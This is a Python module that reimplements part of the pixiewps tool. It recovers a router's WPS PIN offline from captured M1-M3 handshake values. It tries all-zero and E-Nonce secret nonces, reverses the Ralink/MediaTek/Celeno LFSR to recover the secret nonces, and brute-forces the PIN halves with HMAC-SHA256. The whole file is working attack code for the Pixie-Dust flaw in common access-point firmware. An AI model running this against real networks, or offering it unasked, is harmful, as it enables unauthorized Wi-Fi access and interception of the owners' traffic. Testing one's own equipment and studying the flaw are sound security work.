#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pure-Python Pixie-Dust offline PIN recovery (stdlib only).

A partial reimplementation of pixiewps: given the six values collected from the
WPS M1-M3 exchange (PKE, PKR, E-Hash1, E-Hash2, AuthKey, E-Nonce) it recovers
the enrollee's secret nonces E-S1/E-S2 and brute-forces the WPS PIN offline.

Modes implemented (the fast, high-yield ones — no external binary, no slow
2**32 sweeps):
  * trivial:  E-S1 = E-S2 = 0
  * trivial:  E-S1 = E-S2 = E-Nonce
  * Ralink/MediaTek/Celeno LFSR (taps 0x80000057) via O(1) backward inversion
    of the PRNG from the observed E-Nonce — the classic Pixie-Dust target.

Not implemented here (fall back to the C `pixiewps` binary): eCos PRNGs, the
RTL819x glibc time-seed search, and the unbounded `--force` brute. Those are
either slow as interpreted Python loops or rarely auto-selected.

The PIN brute itself is fast: hashlib/hmac are C-backed, so ~10^4+10^3
HMAC-SHA256 evaluations complete in tens of milliseconds.
"""
import hashlib
import hmac

import wps_crypto as wc

WPS_NONCE_LEN = 16
RALINK_TAPS = 0x80000057
_MASK = 0xFFFFFFFF


def _checksum(pin7):
    """Standard WPS checksum of a 7-digit integer."""
    acc = 0
    while pin7:
        acc += 3 * (pin7 % 10)
        pin7 //= 10
        acc += pin7 % 10
        pin7 //= 10
    return (10 - acc % 10) % 10


def _psk_half(authkey, half):
    return hmac.new(authkey, half.encode(), hashlib.sha256).digest()[:16]


def _crack(authkey, pke, pkr, e_hash1, e_hash2, e_s1, e_s2):
    """Brute-force the 8-digit PIN given the secret nonces. Returns pin or None."""
    first = None
    for fh in range(10000):
        s = '%04d' % fh
        if wc.wps_hash(authkey, e_s1, _psk_half(authkey, s), pke, pkr) == e_hash1:
            first = s
            break
    if first is None:
        return None
    first_n = int(first)
    # Checksum-valid second halves first (the common case).
    for sh in range(1000):
        c = sh * 10 + _checksum(first_n * 1000 + sh)
        s2 = '%04d' % c
        if wc.wps_hash(authkey, e_s2, _psk_half(authkey, s2), pke, pkr) == e_hash2:
            return first + s2
    # Fallback: PINs whose checksum digit is "wrong" (rare, non-conformant APs).
    for sh in range(10000):
        if _checksum(first_n * 1000 + sh // 10) == sh % 10:
            continue   # already tried above
        s2 = '%04d' % sh
        if wc.wps_hash(authkey, e_s2, _psk_half(authkey, s2), pke, pkr) == e_hash2:
            return first + s2
    return None


# ---- Ralink/MediaTek/Celeno LFSR (Galois, taps 0x80000057) ----
def _randbyte(state):
    r = 0
    for _ in range(8):
        if state[0] & 1:
            state[0] = (((state[0] ^ RALINK_TAPS) >> 1) | 0x80000000) & _MASK
            bit = 1
        else:
            state[0] = (state[0] >> 1) & _MASK
            bit = 0
        r = ((r << 1) | bit) & 0xFF
    return r


def _restore(state, byte):
    for _ in range(8):
        bit = byte & 1
        byte >>= 1
        if bit:
            state[0] = (((state[0] << 1) ^ RALINK_TAPS) | 1) & _MASK
        else:
            state[0] = (state[0] << 1) & _MASK


def _randbyte_backwards(state):
    r = 0
    for i in range(8):
        if state[0] & 0x80000000:
            state[0] = (((state[0] << 1) ^ RALINK_TAPS) | 1) & _MASK
            bit = 1
        else:
            state[0] = (state[0] << 1) & _MASK
            bit = 0
        r |= bit << i
    return r


def _ralink_secret_nonces(e_nonce):
    """Recover (E-S1, E-S2) from a Ralink-LFSR-generated E-Nonce, or None."""
    state = [0]
    for i in reversed(range(WPS_NONCE_LEN)):
        _restore(state, e_nonce[i])
    saved = state[0]
    check = [saved]
    if any(_randbyte(check) != e_nonce[j] for j in range(WPS_NONCE_LEN)):
        return None   # not this PRNG
    state[0] = saved
    e_s2 = bytearray(WPS_NONCE_LEN)
    for i in reversed(range(WPS_NONCE_LEN)):
        e_s2[i] = _randbyte_backwards(state)
    e_s1 = bytearray(WPS_NONCE_LEN)
    for i in reversed(range(WPS_NONCE_LEN)):
        e_s1[i] = _randbyte_backwards(state)
    return bytes(e_s1), bytes(e_s2)


def recover_pin(pke, pkr, e_hash1, e_hash2, authkey, e_nonce):
    """Try the fast Pixie-Dust modes. Returns the 8-digit PIN string or None.

    All arguments are bytes (PKE/PKR 192, hashes/authkey 32, E-Nonce 16).
    """
    zero = b'\x00' * WPS_NONCE_LEN
    candidates = []
    ralink = _ralink_secret_nonces(e_nonce)
    if ralink:
        candidates.append(ralink)
    candidates.append((zero, zero))                 # all-zero secret nonces
    candidates.append((e_nonce, e_nonce))           # secret nonces == E-Nonce (RTL819x trivial)
    for e_s1, e_s2 in candidates:
        pin = _crack(authkey, pke, pkr, e_hash1, e_hash2, e_s1, e_s2)
        if pin:
            return pin
    return None


def _hx(s):
    return bytes.fromhex(s)


def recover_pin_hex(pke, pkr, e_hash1, e_hash2, authkey, e_nonce):
    """Hex-string wrapper around recover_pin (matches PixiewpsData fields)."""
    try:
        return recover_pin(_hx(pke), _hx(pkr), _hx(e_hash1), _hx(e_hash2),
                           _hx(authkey), _hx(e_nonce))
    except ValueError:
        return None
